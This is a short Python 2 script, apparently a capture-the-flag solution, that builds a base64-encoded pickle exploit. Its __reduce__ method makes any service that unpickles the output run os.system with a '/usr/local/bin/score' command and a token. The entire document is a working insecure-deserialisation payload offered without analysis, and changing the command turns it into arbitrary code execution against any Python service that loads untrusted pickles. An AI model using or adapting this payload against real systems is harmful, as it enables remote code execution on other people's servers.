import os
import cPickle
import base64

class Blah(object):
  def __reduce__(self):
    return (os.system,("/usr/local/bin/score 2fdb31a2-ca58-4650-abfb-9406be061d69 ",))

print base64.b64encode(cPickle.dumps(Blah()))
